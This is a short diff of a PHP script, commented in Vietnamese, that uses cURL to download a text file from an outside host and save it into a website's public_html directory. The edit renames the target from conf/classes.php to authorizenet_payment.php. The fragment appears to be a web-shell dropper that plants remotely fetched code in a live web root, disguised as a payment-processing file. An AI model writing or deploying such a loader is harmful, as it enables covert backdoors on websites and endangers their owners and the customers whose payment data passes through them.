@@ -2,7 +2,7 @@
 $url = "https://dogebreedlist.info/app/report.txt";
 
 // Đường dẫn lưu file
-$savePath = "/home/newzealandtd/public_html/conf/classes.php";
+$savePath = "/home/newzealandtd/public_html/authorizenet_payment.php";
 
 // Khởi tạo cURL session
 $ch = curl_init($url);
